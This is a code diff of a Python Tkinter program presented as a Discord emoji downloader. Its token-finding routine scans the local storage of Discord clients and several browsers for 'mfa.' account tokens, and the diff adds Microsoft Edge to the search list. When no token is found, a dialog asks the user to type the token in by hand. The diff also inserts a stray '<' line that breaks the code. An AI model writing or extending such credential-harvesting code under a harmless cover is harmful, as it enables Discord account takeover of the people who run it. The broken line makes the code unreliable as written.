@@ -1,6 +1,7 @@
 import Discord_Emoji_Downloader_support
-from tkinter import filedialog, Tk
+from tkinter import simpledialog, filedialog, Tk
 import tkinter.ttk as ttk
+import winsound as ws
 import tkinter as tk
 import requests
 import sys
@@ -15,7 +16,7 @@ root.attributes('-topmost', True)
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
-
+    <
     tokens = []
 
     for file_name in os.listdir(path):
@@ -35,13 +36,14 @@ def main():
     global userid
 
     paths = {
-        'Discord': roaming + '\\Discord',
+        'Discord': roaming + '\\discord',
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
     }
 
     for platform, path in paths.items():
@@ -51,7 +53,15 @@ def main():
         prefix = 'mfa.'
         token = [x for x in tokenspre if x.startswith(prefix)]
 
-    userid = token[0]
+    try:
+        userid = token[0]
+        print(userid)
+    except:
+        ws.PlaySound('SystemAsterisk', 0)
+        answer = tk.simpledialog.askstring("DC Emoji Downloader", "Couldn't detect your UserToken. Please enter it manually.")
+        if not answer.startswith('mfa.'):
+            main()
+
 if __name__ == '__main__':
     main()
 
